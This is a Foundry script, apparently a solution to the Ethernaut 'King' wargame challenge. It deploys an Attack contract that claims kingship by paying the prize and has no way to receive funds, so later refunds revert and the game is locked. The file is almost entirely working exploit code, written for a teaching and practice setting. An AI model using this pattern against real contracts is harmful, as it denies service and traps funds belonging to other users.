//SPDX-License-Identifier:UNLICENSED
pragma solidity ^0.8.0;

import "../src/King.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Attack {
    constructor(King _king) payable {
        (bool success,) = address(payable(_king)).call{value: msg.value}("");
        require(success);   
    }
}
contract KingSolution is Script {
    King public kingInstance = King(payable(0x7d30F7cd2beD7e6f26cCB88118324B77A8952E65));
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Attack{value: kingInstance.prize()}(kingInstance);
        vm.stopBroadcast();
    }
}